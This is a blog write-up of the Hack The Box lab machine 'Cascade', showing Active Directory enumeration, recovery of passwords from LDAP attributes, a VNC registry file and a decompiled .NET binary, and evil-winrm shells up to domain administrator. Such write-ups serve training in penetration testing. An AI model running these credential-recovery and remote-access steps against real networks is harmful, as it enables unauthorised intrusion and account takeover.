---
title: HTB - CCT INF Path - Cascade 
date: 2024-11-27 13:37:11 +/-TTTT
categories: [CTFs, HTB]
tags: [ctfs, hacking, htb, ctt_inf]     # TAG names should always be lowercase
---


![alt text](/assets/images/27-11-2024/cascade.png "Cascade Card")

# Initial Setup and 

## Setup
```bash
export target=10.10.10.182
cp /etc/hosts .
```

This will define a variable so we don't need to remember the IP address. Copying `/etc/hosts` to the directory will also allow us to keep track of hosts and subdomains, this is helpful for going back to machines as all the information is kept in the directory and copied to `/etc/hosts` when needed.

# Enumeration
![alt text](/assets/images/27-11-2024/enumerate.gif "Dalek")

Alrighty let's get cracking! Starting with an `nmap`:
```bash
nmap -p- -sCV -oA scans/nmap_full -Pn -v $target
```
Generally I don't go for a full scan first when using `-Pn`, however, in this case it was sufficiently fast enough. With Windows not using `-p-` will miss a key Windows port `5985` which is `WinRm`.

Output:
```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-27 09:56:48Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-11-27T09:57:37
|_  start_date: 2024-11-26T21:41:07
```
The key takeaways from above are:
- Appears to be a `Windows 2008 Server r2 SP1`
- Hostname is `CASC-DC1` which appears to be using a Domain 
Controller naming convention.
- Domain is called `cascade.local`
- `53/88/389/3268` make this machine extremely likely to be a Domain Controller.
- `5985` WinRM open, makes access to this machine a lot easier.

Our `/etc/hosts` file now looks like:
```bash
127.0.0.1       localhost
127.0.1.1       kali

10.10.10.182    CASC-DC1 cascade.local CASC-DC1.cascade.local
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

A great tool for Active Directory domain enumeration is `enum4linux`, however, it can be very hit or miss unauthenticated as we currently are:
```bash
enum4linux -U $target
```

Output (tidied up for ease of viewing):
```bash
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Nov 27 10:14:38 2024

 =========================================( Target Information )=========================================
                                                                                                                                                             
Target ........... 10.10.10.182                                                                                                                              
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.10.182 )============================
                         
[E] Can't find workgroup/domain                                                          
 ===================================( Session Check on 10.10.10.182 )===================================
           
[+] Server 10.10.10.182 allows sessions using username '', password ''                                                                                       
 ================================( Getting domain SID for 10.10.10.182 )================================
                          
Domain Name: CASCADE                                                         
Domain Sid: S-1-5-21-3332504370-1206983947-1165150453

[+] Host is part of a domain (not a workgroup)                                                                     
 =======================================( Users on 10.10.10.182 )=======================================

user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
enum4linux complete on Wed Nov 27 10:14:50 2024
```

As we are unauthenticated it would appear RPC is allowing anonymous sessions. We can check this with:
```bash
rpcclient -U "" -N -c "enumdomusers" $target | tee scans/rpcclient_enumdomusers
```

Output:
```bash
user:[CascGuest] rid:[0x1f5]
<SNIP>
user:[i.croft] rid:[0x46f]
```

If RPC is allowing unauthenticated sessions... I wonder if LDAP is too?
```bash
ldapsearch -x -H ldap://10.10.10.182 -b "DC=CASCADE,DC=local" | tee scans/ldapsearch
```

Output not shown as it's bloomin huge, none the less yes.. it allows unauthenticated queries.

## Obtaining user.txt
### First User
We now have a list of usernames and a list of user properties. We could query LDAP for just the specific user information or we could just parse what we already have. From an OpSec perspective re-running commands or constantly querying can be bad. We're making the most of what we have.

It's hacky but it'll do! Love a good bash for loop.
```bash
for i in $(cat users); do grep "sAMAccountName: $i" scans/ldapsearch -A 30; done
```

Perusing through the output we see an odd field set on `r.thompson`:
```bash
# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109193126.0Z
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133771317813752455
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=

# {4026EDF8-DBDA-4AED-8266-5A04B80D9327}, Policies, System, cascade.local
dn: CN={4026EDF8-DBDA-4AED-8266-5A04B80D9327},CN=Policies,CN=System,DC=cascade
 ,DC=local

# {D67C2AD5-44C7-4468-BA4C-199E75B2F295}, Policies, System, cascade.local
dn: CN={D67C2AD5-44C7-4468-BA4C-199E75B2F295},CN=Policies,CN=System,DC=cascade
 ,DC=local

# Util, Services, Users, UK, cascade.local
dn: CN=Util,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Util
distinguishedName: CN=Util,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109194521.0Z
```

The field is:
```bash
cascadeLegacyPwd: clk0bjVldmE=
```

Base64 decoding this we are provided with:
```bash
rY4n5eva
```

Let's check the credentials are valid:
```bash
netexec smb $target -u "r.thompson" -p "rY4n5eva" --shares

SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)                                                                                                                                                     
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva                                                                    
SMB         10.10.10.182    445    CASC-DC1         [*] Enumerated shares                                                                                    
SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark                                                                   
SMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------                                                                   
SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin                                                             
SMB         10.10.10.182    445    CASC-DC1         Audit$                          
SMB         10.10.10.182    445    CASC-DC1         C$                              Default share
SMB         10.10.10.182    445    CASC-DC1         Data            READ            
SMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPC
SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share 
```

Bingo bongo! Attempting to login via `WinRM` does not work. However, we can see `r.thompson` has access to a non-standard SMB Share `Data`. Let's view the contents:
```bash
smbclient \\\\$target\\Data -U "CASCADE\r.thompson" --password "rY4n5eva"

smb: \> dir
  .                                   D        0  Mon Jan 27 03:27:34 2020
  ..                                  D        0  Mon Jan 27 03:27:34 2020
  Contractors                         D        0  Mon Jan 13 01:45:11 2020
  Finance                             D        0  Mon Jan 13 01:45:06 2020
  IT                                  D        0  Tue Jan 28 18:04:51 2020
  Production                          D        0  Mon Jan 13 01:45:18 2020
  Temps                               D        0  Mon Jan 13 01:45:15 2020

                6553343 blocks of size 4096. 1621412 blocks available
smb: \> 
```

There's a lovely email in the `IT` directory:
![alt text](/assets/images/27-11-2024/email.png "IT email")
In a nutshell a user was created called `TempAdmin` with "the normal password". We can check if this account still exists later.

### Second User
Again enumerating through the directories inside `IT` we see:
```bash
smb: \IT\Temp\s.smith\> dir
  .                                   D        0  Tue Jan 28 20:00:01 2020
  ..                                  D        0  Tue Jan 28 20:00:01 2020
  VNC Install.reg                     A     2680  Tue Jan 28 19:27:44 2020

                6553343 blocks of size 4096. 1621412 blocks available
smb: \IT\Temp\s.smith\>
```

VNC files are notorious for storing decryptable passwords in files or the registry. Download the file using `get` and view the contents:
```bash
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"RunControlInterface"=dword:00000001
"IdleTimeout"=dword:00000000
"VideoClasses"=""
"VideoRects"=""
```

Looks to be creds! Let's decrypt them:

We need the following part from the VNC file:
- "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```bash
echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d

sT333ve2
```

Let's do the same `netexec` command as previous to confirm the credentials:
```bash
netexec smb 10.10.10.182 -u "s.smith" -p "sT333ve2" --shares

SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
SMB         10.10.10.182    445    CASC-DC1         [*] Enumerated shares
SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
SMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------
SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.10.10.182    445    CASC-DC1         Audit$          READ            
SMB         10.10.10.182    445    CASC-DC1         C$                              Default share
SMB         10.10.10.182    445    CASC-DC1         Data            READ            
SMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPC
SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share
```

Confirmed valid credentials and they also have access to the `Audit$` share. `WinRM` also comes up trumps this time!:
```bash
evil-winrm -i $target -u s.smith -p sT333ve2
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\s.smith\Documents> whoami
cascade\s.smith
*Evil-WinRM* PS C:\Users\s.smith\Documents>
```

Mentioned earlier an account called `TempAdmin` was created, however, when checking this account no longer exists hmpphh:
```bash
*Evil-WinRM* PS C:\Users\s.smith\Documents> net user /domain

User accounts for \\

-------------------------------------------------------------------------------
a.turnbull               administrator            arksvc
b.hanson                 BackupSvc                CascGuest
d.burman                 e.crowe                  i.croft
j.allen                  j.goodhand               j.wakefield
krbtgt                   r.thompson               s.hickson
s.smith                  util
The command completed with one or more errors.
```


We can now also obtain `user.txt` from the desktop of `s.smith`:
```bash
*Evil-WinRM* PS C:\Users\s.smith\Desktop> type user.txt
87<SNIP>28
```

## Obtaining root.txt
## First User
As we identified previously `s.smith` has access to the `Audit$` share, let's go have a look:
```bash
smbclient \\\\$target\\Audit$ -U "CASCADE\s.smith" --password "sT333ve2"
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jan 29 18:01:26 2020
  ..                                  D        0  Wed Jan 29 18:01:26 2020
  CascAudit.exe                      An    13312  Tue Jan 28 21:46:51 2020
  CascCrypto.dll                     An    12288  Wed Jan 29 18:00:20 2020
  DB                                  D        0  Tue Jan 28 21:40:59 2020
  RunAudit.bat                        A       45  Tue Jan 28 23:29:47 2020
  System.Data.SQLite.dll              A   363520  Sun Oct 27 06:38:36 2019
  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 06:38:38 2019
  x64                                 D        0  Sun Jan 26 22:25:27 2020
  x86                                 D        0  Sun Jan 26 22:25:27 2020

                6553343 blocks of size 4096. 1621406 blocks available
smb: \>
```

We download the executable `CascAudit.exe` and attempt to see what type of executable it is:
```bash
file CascAudit.exe

CascAudit.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

It would appear to be a 32bit C# binary, luckily C# is reeeaaalllyyyy easy to decompile. For Windows you have `DNSpy` for and Linux you have `ILSpy`. I'll be using `ILSpy`. Opening the executable in `ILSpy` you are presented with:

![alt text](/assets/images/27-11-2024/ilspy_1.png "ILSpy")

From here we can see a password is being decrypted using the key `c4scadek3y654321`:

```c#
password = Crypto.DecryptString(encryptedString, "c4scadek3y654321");
```

However, inside of the executable there doesn't seem to be any crypto functions/methods. However, there was `CascCrypto.dll`. In Windows you could easily see the exports, but let's just show it into `ILSpy`:

![alt text](/assets/images/27-11-2024/ilspy_2.png "ILSpy")

Here we see the following code snippet:
```c#
Aes aes = Aes.Create();
aes.KeySize = 128;
aes.BlockSize = 128;
aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
aes.Mode = CipherMode.CBC;
```

We also need a password to decrypt, downloading the `Audit.db` from the `Audit$` share we are presented with:

```bash
sqlite3 Audit.db

SQLite version 3.46.0 2024-05-23 13:25:27
Enter ".help" for usage hints.
sqlite> .tables
DeletedUserAudit  Ldap              Misc            
sqlite> select * from Ldap;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
sqlite>
```

This can be done in CyberChef or the bash. Let's do this in bash...

```bash
echo "BQO5l5Kj9MdErXx6Q6AGOw==" | base64 -d | openssl aes-128-cbc -d -K "$(echo -n 'c4scadek3y654321' | xxd -p)" -iv "$(echo -n '1tdyjCbY1Ix49842' | xxd -p)"

w3lc0meFr31nd
```

That's ugly (but great) in essence decode the base64 and send it into `openssl`. The `openssl` command is a general decrypt for AES-128-CBC. Both the `-K` and `-iv` flags have a command substitution that takes the keys and iv and turns them into bytes that `openssl` expects.

## Administrator
As before let's check the credentials.

Testing these credentials to ensure they are valid:

```bash
evil-winrm -i $target -u Arksvc -p w3lc0meFr31nd
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami
cascade\arksvc
*Evil-WinRM* PS C:\Users\arksvc\Documents>
```

Performing general user enumeration we see the following groups.

```bash
*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ===============================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
*Evil-WinRM* PS C:\Users\arksvc\Documents>
```


The interesting of these is `CASCADE\AD Recycle Bin` which allows us to view deleted Active Directory Objects. The command to use is:
```powershell
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

Running the command via `WinRM` provides a lot of output. As previously mentioned a user was created called `TempAdmin`, let's just print their details:
```powershell
Get-ADObject -Filter 'isDeleted -eq $true -and sAMAccountName -eq "TempAdmin"' -IncludeDeletedObjects -Properties
*
```
Output:
```bash
accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
```

Hello again `cascadeLegacyPwd`
```bash
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
```

Base64 decode and we get:
```bash
baCT3r1aN00dles
```

Yet again let's check them...
```bash
evil-winrm -i $target -u administrator -p baCT3r1aN00dles
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
cascade\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

Aanndddd `root.txt`:
```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
44<SNIP>66
```

GG WP

![alt text](/assets/images/27-11-2024/completed.gif "Completed")


# TLDR:
- Password for `r.thompson` in `cascadeLegacyPwd` via LDAP.
- Decrypt credentials for `s.smith` in `VNC Install.reg` in `Data` share.
- `s.smith` can access `Audit$` share, decrypt password in Audit.db with iv/key in executable/dll.
- Dump delete objects and get `administrator` password from `TempAdmin` `cascadeLegacyPwd` field.